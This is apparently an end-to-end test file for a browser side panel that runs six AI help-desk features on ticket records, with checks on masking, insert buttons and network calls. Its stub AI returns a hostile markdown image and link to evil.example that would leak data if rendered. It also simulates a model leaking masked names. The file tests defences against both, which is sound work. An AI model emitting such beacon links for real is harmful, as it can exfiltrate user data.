// n. The ITSM features, through the real side panel and the real content script:
//    sentiment-risk, next-best-action, thread-summary, routing-hint, kb-article-draft, major-incident-comms.
//    - the Actions list shows each one for the right kinds of record and for no others (incident, problem, change, case, HR case, item)
//    - each runs end to end with a stub AI: reads (including the look-alike and article reads the reference features make), mask,
//      preview, send, answer; the fixed prompt is the system message; no seeded personal data reaches the preview or the AI server
//    - the answer is only ever text (a hostile answer does not load anything)
//    - kb-article-draft: Insert is refused on an incident (its inserts belong to a kb_knowledge form), "Open a new article form"
//      opens a blank article form in the same tab, and the draft that was carried there fills the title and the body; the real
//      names are never put back into a text that gets published
const { findLeaks } = require('../leaks.js');
const { prepare, errorMark, errorsSince, describeErrors, clickButton, waitForText, textOf, checkAiRun, loadingElements } = require('../common.js');
const { runFeature } = require('../ui.js');

const T = {
  sentiment: 'Sentiment and escalation risk',
  nba: 'Next best actions',
  thread: 'Summarise the discussion',
  routing: 'Where should this go?',
  kb: 'Turn this into a knowledge article',
  major: 'Major incident updates',
};
const ITSM_TITLES = Object.values(T);

// What each kind of record is expected to offer from THIS area's six features.
const EXPECT = {
  incident: ITSM_TITLES,
  problem: [T.thread, T.kb, T.major],
  change: [T.thread, T.major],
  case: [T.sentiment, T.nba, T.thread, T.routing, T.kb],
  hr_case: [],
  requested_item: [T.sentiment, T.nba, T.thread, T.routing, T.kb],
};

const actionTitles = (page) => page.evaluate(() => [...document.querySelectorAll('.ab-features .ab-feature-title')].map((e) => e.innerText.trim()));
const first = (text, kind) => (new RegExp(`\\[${kind}_\\d+\\]`).exec(text) || [''])[0];

// What the stub AI answers, by what the system message is about. It reuses placeholders it was sent, as a model would.
function replier({ system, user }) {
  const person = first(user, 'PERSON') || 'the customer';
  if (/see early whether a customer is getting upset/.test(system)) {
    return `Mood: frustrated\nEscalation risk: High - the customer wrote three times and the SLA is used up\nWhat triggered it: "still not working" | "same as yesterday"\nSuggested approach: Call ${person} today and agree the next update time.`;
  }
  if (/work through a ticket step by step/.test(system)) {
    return '- [ ] Check the gateway certificate expiry (from INC0009640)\n- [ ] Switch the client profile to TCP mode (KB0010001)\n- [ ] Confirm with the customer after a day (from this ticket)';
  }
  if (/catch up on a long thread/.test(system)) {
    // A hostile answer: it must be shown as text and nothing may be fetched.
    return `Decisions:\n- ${person} agreed to send the client version.\n![x](https://evil.example/?q=thread)\nOpen questions:\n- [the report](https://evil.example/report?q=3) Who owns the certificate?\nWho owns what:\n- The network team.\nNext:\n- Check the certificate.`;
  }
  if (/send a ticket to the right place/.test(system)) {
    return 'Category: Network - same as INC0009640\nAssignment group: Network Support - same as INC0009640\nPriority: 2 - High - same as this ticket';
  }
  if (/turn a solved ticket into a knowledge article/.test(system)) {
    // A model that ignores "no names": the placeholders must stay placeholders, because this text is published.
    return `Title: VPN drops every ten minutes after a certificate rotation\nSymptoms: The VPN disconnects about every ten minutes. First reported by ${person} (${first(user, 'EMAIL') || '[EMAIL_1]'}).\nCause: The gateway certificate on EU-2 was replaced and the chain was incomplete.\nResolution: Install the full certificate chain and restart the gateway service.\nSteps:\n1. Check the certificate chain on the gateway.\n2. Import the intermediate certificate.\n3. Restart the gateway service.\nApplies to: VPN gateway EU`;
  }
  if (/write stakeholder updates during a major incident/.test(system)) {
    return 'Executive: Remote access is unstable for some staff. No estimate yet.\nTechnical: Session resets on gateway EU-2; the certificate chain is being checked.\nCustomer-facing: Some people see the VPN disconnect. We are working on it.\nNext update: [time]';
  }
  return null;
}

module.exports = {
  id: 'n',
  title: 'ITSM features end to end: the right kinds, a full AI run each, masked, shown as text; the article draft carried to a blank article form',
  async run(t, ctx) {
    const { ai, inst, data } = ctx;
    await prepare(ctx);
    ai.setReplier(replier);
    const mark = errorMark(ctx);

    // ---- 1. Which kinds of record get which actions --------------------------------------------------------------------------
    const tickets = [
      ['incident', `/incident.do?sys_id=${data.INCIDENT_ID}`, data.INCIDENT_NUMBER],
      ['problem', `/problem.do?sys_id=${data.PROBLEM_ID}`, data.PROBLEM_NUMBER],
      ['change', `/change_request.do?sys_id=${data.CHANGE_ID}`, data.CHANGE_NUMBER],
      ['case', `/sn_customerservice_case.do?sys_id=${data.CASE_ID}`, data.CASE_NUMBER],
      ['hr_case', `/sn_hr_core_case.do?sys_id=${data.HR_CASE_ID}`, data.HR_CASE_NUMBER],
      ['requested_item', `/sc_req_item.do?sys_id=${data.RITM_ID}`, data.RITM_NUMBER],
    ];
    let ticket = await ctx.openInstancePage(tickets[0][1], 'ticket-incident');
    const panel = await ctx.openPanel();
    const p = panel.page;
    await waitForText(p, data.INCIDENT_NUMBER, { timeout: 20000 });
    await waitForText(p, 'Summarise this ticket', { timeout: 15000 });
    for (const [kind, path, number] of tickets) {
      if (kind !== 'incident') {
        await ticket.close();
        ticket = await ctx.openInstancePage(path, `ticket-${kind}`);
        await waitForText(p, number, { timeout: 20000 });
        await p.waitForSelector('.ab-features', { timeout: 15000 });
        await ctx.sleep(300);
      }
      const titles = await actionTitles(p);
      const want = EXPECT[kind];
      const got = ITSM_TITLES.filter((x) => titles.includes(x));
      t.check(`${kind}: the ITSM actions offered are exactly ${want.length ? want.map((w) => `"${w}"`).join(', ') : 'none'}`, JSON.stringify(got.sort()) === JSON.stringify([...want].sort()), `got: ${got.join(' | ')}`);
    }
    t.check('looking at the lists made no AI request', ai.requests.length === 0);
    await ticket.close();

    // ---- 2. Runs on the incident --------------------------------------------------------------------------------------------
    ticket = await ctx.openInstancePage(tickets[0][1], 'ticket-incident');
    await waitForText(p, data.INCIDENT_NUMBER, { timeout: 20000 });
    await p.waitForSelector('.ab-features', { timeout: 15000 });
    await ctx.sleep(300);
    const gform = (fn) => ticket.evaluate(fn);
    const close = () => clickButton(p, /^Close/);
    let before = ai.requests.length;

    // sentiment-risk: counted signals + the newest notes; the answer names the customer (rehydrated) and offers work notes only
    let ran = await runFeature(p, new RegExp(`^${T.sentiment}`));
    let req = await checkAiRun(t, ctx, p, 'sentiment-risk', ran, { before, system: /see early whether a customer is getting upset/, userHas: [/Signals counted by Agent Buddy/i] });
    t.check('sentiment-risk: the answer shows the real caller name (put back locally) and the four lines', Boolean(ran.result) && ran.result.includes(data.SEED.callerName) && /Mood: frustrated/.test(ran.result) && /Escalation risk: High/.test(ran.result), (ran.result || '').replace(/\s+/g, ' ').slice(0, 120));
    t.check('sentiment-risk: offers "Add to work notes" (internal) and Copy, nothing to the customer', (await p.evaluate(() => [...document.querySelectorAll('.ab-card button')].map((b) => b.innerText.trim()))).includes('Add to work notes') && !(await panelText(p)).includes('Insert as customer comment'));
    await close();

    // next-best-action: it reads solved look-alikes and articles first (reads through the content script), then the AI is asked
    before = ai.requests.length;
    ran = await runFeature(p, new RegExp(`^${T.nba}`));
    req = await checkAiRun(t, ctx, p, 'next-best-action', ran, { before, system: /work through a ticket step by step/, userHas: [/REFERENCE MATERIAL/i, /INC0009\d{3}/, /KB00\d{5}/] });
    t.check('next-best-action: the look-alike tickets are other people\'s: no other caller name travelled with them', req ? !/Charlie|Whitherspoon|charlie\.w/i.test(req.raw) : false);
    t.check('next-best-action: the checklist is shown as a list', await p.evaluate(() => document.querySelectorAll('.ab-output li').length >= 3));
    await close();

    // thread-summary: a hostile answer (image + link) must stay text
    before = ai.requests.length;
    const netBefore = ctx.net.length;
    ran = await runFeature(p, new RegExp(`^${T.thread}`));
    req = await checkAiRun(t, ctx, p, 'thread-summary', ran, { before, system: /catch up on a long thread/, userHas: [/Customer-visible comment|Internal work note/] });
    await ctx.sleep(500);
    t.check('thread-summary: the hostile answer (image, link) is shown as text, nothing in the panel can load it', (await loadingElements(p)) === 0 && /evil\.example/.test(ran.result || ''), (ran.result || '').replace(/\s+/g, ' ').slice(0, 100));
    t.check('thread-summary: nothing contacted evil.example', !ctx.net.slice(netBefore).some((n) => /evil\.example/.test(n.url)));
    // Insert into work notes: appended below what the agent typed, one setValue, never saved
    await clickButton(p, /^Add to work notes/);
    await waitForText(p, /Inserted into the form/, { timeout: 8000 });
    const calls = await gform(() => window.__gformCalls);
    t.check('thread-summary: "Add to work notes" made exactly one setValue on work_notes, below the typed text, and never saved', calls.length === 1 && calls[0].name === 'work_notes' && calls[0].value.startsWith('Checking the gateway certificate now.') && calls[0].value.includes('Decisions:') && (await gform(() => window.__gformSaves.length)) === 0, JSON.stringify(calls).slice(0, 160));
    await close();

    // routing-hint: copy only (the agent decides where a ticket goes); the look-alikes carry their group and priority
    before = ai.requests.length;
    ran = await runFeature(p, new RegExp(`^${T.routing}`));
    req = await checkAiRun(t, ctx, p, 'routing-hint', ran, { before, system: /send a ticket to the right place/, userHas: [/Network Support/, /INC0009\d{3}/] });
    const routingButtons = await p.evaluate(() => [...document.querySelectorAll('.ab-card .ab-row button')].map((b) => b.innerText.trim()));
    t.check('routing-hint: Copy only: no Insert button of any kind', routingButtons.includes('Copy') && !routingButtons.some((b) => /^(Add|Insert)/.test(b)), routingButtons.join(' | '));
    await close();

    // major-incident-comms: SLAs and tasks go in; copy only
    before = ai.requests.length;
    ran = await runFeature(p, new RegExp(`^${T.major}`));
    req = await checkAiRun(t, ctx, p, 'major-incident-comms', ran, { before, system: /write stakeholder updates during a major incident/, userHas: [/SLAs?/, /TASK0010005/] });
    t.check('major-incident-comms: the "[time]" the manager fills in is shown as written, and the answer has Copy only', /Next update: \[time\]/.test(ran.result || '') && !(await panelText(p)).includes('Add to work notes'));
    await close();

    // ---- 3. kb-article-draft: Insert refused here; the draft is carried to a blank article form -------------------------------------
    before = ai.requests.length;
    ran = await runFeature(p, new RegExp(`^${T.kb}`));
    req = await checkAiRun(t, ctx, p, 'kb-article-draft', ran, { placeholders: 'kept', before, system: /turn a solved ticket into a knowledge article/, userHas: [/REFERENCE MATERIAL/i], userLacks: [data.INCIDENT_NUMBER] });
    t.check('kb-article-draft: the draft keeps hidden details hidden: placeholders stay, the caller name and email are NOT put back', /\[PERSON_\d+\]/.test(ran.result || '') && !(ran.result || '').includes(data.SEED.callerName) && !(ran.result || '').includes(data.SEED.callerEmail), (ran.result || '').replace(/\s+/g, ' ').slice(0, 140));
    const buttons = await p.evaluate(() => [...document.querySelectorAll('.ab-card .ab-row button')].map((b) => b.innerText.trim()));
    t.check('kb-article-draft: offers title and body inserts, "Open a new article form" and Copy', ['Insert title into the article form', 'Insert body into the article form', 'Open a new article form', 'Copy'].every((b) => buttons.includes(b)), buttons.join(' | '));
    const callsBefore = await gform(() => window.__gformCalls.length);
    await clickButton(p, /^Insert title into the article form/);
    await waitForText(p, /This goes into a kb_knowledge form\. Open that form first/, { timeout: 8000 });
    t.check('kb-article-draft: Insert is REFUSED on an incident (short_description of the incident is not touched)', (await gform(() => window.__gformCalls.length)) === callsBefore, await textOf(p, '.ab-note-warn'));

    await clickButton(p, /^Open a new article form/);
    await ctx.waitUntil('the tab to open a blank kb_knowledge form', async () => ticket.url().includes('nav_to.do') && ticket.url().includes(encodeURIComponent('kb_knowledge.do')), { timeout: 10000 });
    t.check('"Open a new article form" navigated the SAME tab to a blank article form on the same instance', ticket.url().startsWith(inst.origin) && decodeURIComponent(ticket.url()).includes('kb_knowledge.do?sys_id=-1'), ticket.url());
    // The carried draft appears on the blank form, with the same buttons.
    await waitForText(p, 'Insert body into the article form', { timeout: 20000 });
    t.check('the carried draft is shown on the blank article form (title of the feature and the text)', (await panelText(p)).includes(T.kb) && (await panelText(p)).includes('VPN drops every ten minutes'));
    t.check('...and it no longer offers "Open a new article form" (the form is open)', !(await panelText(p)).includes('Open a new article form'));
    const kbFrame = await ctx.waitUntil('the article form frame', async () => ticket.frames().find((f) => f.url().startsWith(inst.origin) && new URL(f.url()).pathname === '/kb_knowledge.do') || null, { timeout: 10000 });
    await kbFrame.waitForFunction(() => window.__gformReady === true, { timeout: 10000 });
    t.check('the blank article form is a new record with an empty title and body', await kbFrame.evaluate(() => window.g_form.isNewRecord() === true && window.g_form.getValue('short_description') === '' && window.g_form.getValue('text') === ''));

    await clickButton(p, /^Insert title into the article form/);
    await waitForText(p, /Inserted into the form/, { timeout: 10000 });
    await clickButton(p, /^Insert body into the article form/);
    await ctx.waitUntil('the body to be inserted', async () => (await kbFrame.evaluate(() => window.__gformCalls.length)) >= 2, { timeout: 8000 });
    const kbCalls = await kbFrame.evaluate(() => window.__gformCalls);
    t.check('the title went into short_description and the body into text, one setValue each, nothing saved', kbCalls.length === 2 && kbCalls[0].name === 'short_description' && kbCalls[1].name === 'text' && (await kbFrame.evaluate(() => window.__gformSaves.length)) === 0, kbCalls.map((c) => c.name).join(','));
    t.check('the title is just the title line', kbCalls[0]?.value === 'VPN drops every ten minutes after a certificate rotation', kbCalls[0]?.value);
    t.check('the body starts at Symptoms and has the steps; the Title line is not in it', /^Symptoms:/.test(kbCalls[1]?.value || '') && /1\. Check the certificate chain/.test(kbCalls[1]?.value || '') && !/^Title:/m.test(kbCalls[1]?.value || ''), (kbCalls[1]?.value || '').replace(/\n/g, '\\n').slice(0, 120));
    const published = `${kbCalls[0]?.value}\n${kbCalls[1]?.value}`;
    t.check('what went into the article form holds no real name, email or number of the ticket (placeholders only)', findLeaks(published, data).critical.length === 0 && !published.includes(data.INCIDENT_NUMBER) && /\[PERSON_\d+\]/.test(published), findLeaks(published, data).critical.join(' | '));

    const bad = errorsSince(ctx, mark);
    t.check('no console error, page error or CSP violation during these runs', bad.length === 0, describeErrors(bad));

    await panel.close();
    await ticket.close();
    ai.reset();
  },
};

async function panelText(page) {
  return page.evaluate(() => document.body.innerText);
}
